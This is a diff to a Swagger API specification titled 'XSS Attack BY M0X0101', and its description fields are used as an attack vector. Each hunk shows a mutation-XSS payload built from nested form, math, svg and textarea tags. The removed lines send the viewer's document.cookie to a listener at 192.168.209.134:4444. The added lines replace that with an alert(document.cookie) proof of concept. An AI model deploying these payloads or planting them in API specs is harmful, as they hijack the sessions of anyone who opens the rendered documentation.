@@ -2,8 +2,7 @@ swagger: '2.0'
 info:
   title: XSS Attack BY M0X0101
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="http://192.168.209.134:4444/?cookie=" + encodeURIComponent(document.cookie) onerror="this.src='http://192.168.209.134:4444/?cookie=' + encodeURIComponent(document.cookie)">
-</form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
   version: production
 basePath: /JSSResource/
 produces:
@@ -28,8 +27,7 @@ paths:
     delete:
       parameters:
         - description: |
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src="http://192.168.209.134:4444/?cookie=" + encodeURIComponent(document.cookie) onerror="this.src='http://192.168.209.134:4444/?cookie=' + encodeURIComponent(document.cookie)">
-</form>
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.cookie) src=1>"></form>
           format: int64
           in: path
           name: id
